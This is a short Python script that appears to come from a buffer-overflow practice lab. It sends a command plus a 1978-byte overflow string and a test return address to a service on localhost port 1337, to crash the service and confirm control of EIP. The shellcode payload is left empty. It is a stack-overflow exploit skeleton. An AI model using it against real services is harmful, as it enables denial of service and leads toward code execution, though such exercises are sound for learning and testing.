#!/usr/bin/env python3
import socket,sys

host = "127.0.0.1"
port = 1337

def attack():
    cmd = sys.argv[1]
    offset = 1978
    overflow = "a"*offset
    retn = "bbbb" # eip should hold 62626262
    padding = ""
    payload = "" 

    s_buffer = cmd + " " + overflow + retn + padding + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        s.recv(1024)
        print("Sendin buffer to crash the program...")
        s.send(bytes(s_buffer + "\r\n", 'latin-1'))
        print("D0N3 !")
    except:
        print("Could Not connect !")
    
if __name__ == "__main__":

    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <command>")
        sys.exit(1)
    
    attack()